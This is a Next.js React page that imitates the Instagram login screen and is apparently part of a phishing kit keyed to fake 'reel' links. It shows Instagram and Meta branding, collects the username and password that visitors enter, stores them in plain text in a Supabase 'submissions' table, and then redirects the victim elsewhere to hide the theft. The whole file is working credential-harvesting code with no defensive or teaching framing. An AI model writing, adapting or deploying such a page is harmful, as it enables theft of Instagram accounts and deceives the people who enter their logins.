'use client';
import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';
import Image from 'next/image';
import { supabase } from '@/app/lib/supabase';

export default function ReelFormPage() {
  const { reelId } = useParams();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  const [loading, setLoading] = useState(true);
  const [reelData, setReelData] = useState<{ redirectUrl: string, reelId: string } | null>(null);

  useEffect(() => {
    const fetchReelData = async () => {
      if (!reelId) return;

      setLoading(true);
      const { data, error } = await supabase
        .from('reels')
        .select('redirectUrl, reelId')
        .eq('reelId', reelId as string)
        .single();

      if (error || !data) {
        console.error('Error fetching reel data:', error);
        setReelData(null);
      } else {
        setReelData(data);
      }
      setLoading(false);
    };

    fetchReelData();
  }, [reelId]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!reelData) {
      return;
    }

    const { error } = await supabase
      .from('submissions')
      .insert([
        {
          "reelId": reelData.reelId,
          username,
          password,
        },
      ]);

    if (error) {
      console.error('Supabase insert error:', error);
    } else {
      setUsername('');
      setPassword('');
      window.location.href = reelData.redirectUrl;
    }
  };

 if (loading) {
  return (
    <div className="flex flex-col justify-between items-center min-h-screen bg-black py-10">
      <div></div> {}
      <div className="flex justify-center">
        <Image
          src="/loading_logo.png"
          alt="Instagram Logo"
          width={70}
          height={70}
          className="animate-fadeIn"
        />
      </div>
      <div className="flex flex-col items-center">
        <Image
          src="/loading_meta_logo.png"
          alt="Meta Logo"
          width={60}
          height={20}
          className="mt-1"
        />
      </div>
    </div>
  );
}


  if (!reelData) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="w-full max-w-md p-8 space-y-6 bg-white rounded-lg text-center">
          <h1 className="text-2xl font-bold">Link Not Found</h1>
          <p className="text-gray-600">The Reel ID &quot;{reelId}&quot; does not exist or is invalid.</p>
        </div>
      </div>
    );
  }


    return (
    <div className="bg-gray-50 min-h-screen flex items-center justify-center text-zinc-700">
      <div className="flex max-w-5xl w-full px-4">
        {/* Left */}
        <div className="hidden md:flex w-1/2 justify-center items-center">
          <Image
            src="/instagram-web-lox-image.png"
            className="w-2xl"
            alt="Phone preview"
            width={500}
            height={500}
          />
        </div>

        <div className="w-full md:w-1/2 max-w-sm mx-auto">
          <div className="bg-white border border-gray-300 px-8 py-10">
            <Image
              src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
              alt="Instagram"
              className="mx-auto mb-6 w-40"
              width={160}
              height={48}
            />

            <form onSubmit={handleSubmit}>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full mb-2 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm"
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full mb-3 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm"
              />
              <button
                type="submit"
                className="w-full bg-blue-500 hover:bg-[#227aff] transition text-white py-1.5 rounded text-sm font-semibold"
              >
                Log In
              </button>
            </form>

            <div className="flex items-center my-4">
              <div className="flex-grow h-px bg-gray-300"></div>
              <span className="mx-3 text-xs text-gray-500 font-semibold">OR</span>
              <div className="flex-grow h-px bg-gray-300"></div>
            </div>

          <div className='flex items-center flex-col justify-center'>
            <div className="text-center text-sm text-blue-900 font-medium cursor-pointer mb-3">
              Log in with Facebook
            </div>
            <a href='https://www.instagram.com/accounts/password/reset/' className="text-center text-xs text-blue-500 cursor-pointer">
              Forgot password?
            </a>
          </div>
          </div>

          <div className="bg-white border border-gray-300 mt-3 text-sm text-center py-4">
            <p>Don&apos;t have an account?</p>
            <span className="text-blue-500 font-medium cursor-pointer">Sign up</span>
          </div>

          <div className="text-center mt-5">
            <span className="text-sm">Get the app . Android . iOS</span>
            <div className="flex justify-center mt-2 space-x-2">
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
